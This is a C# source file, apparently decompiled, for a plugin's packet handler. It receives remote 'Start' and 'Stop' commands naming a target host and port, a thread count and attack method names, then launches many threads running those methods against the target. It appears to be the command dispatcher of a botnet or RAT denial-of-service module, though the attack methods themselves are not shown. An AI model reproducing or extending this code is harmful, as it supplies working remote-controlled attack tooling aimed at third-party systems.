using System;
using System.Threading;
using Leb128;
using Plugin.Helper;
using Plugin.Methods;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (!(text == "Start"))
			{
				if (text == "Stop")
				{
					Common.CancellationTokenSource.Cancel();
				}
				return;
			}
			Common.CancellationTokenSource = new CancellationTokenSource();
			string[] hostandport = ((string)array[1]).Split(new char[1] { ':' });
			int num = (int)array[2];
			for (int i = 3; i < array.Length; i++)
			{
				Method[] methods = Common.Methods;
				foreach (Method method in methods)
				{
					if (!(method.Name == (string)array[i]))
					{
						continue;
					}
					for (int k = 0; k < num; k++)
					{
						new Thread((ThreadStart)delegate
						{
							method.Run(hostandport[0], Convert.ToInt32(hostandport[1]));
						}).Start();
					}
					break;
				}
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}
}
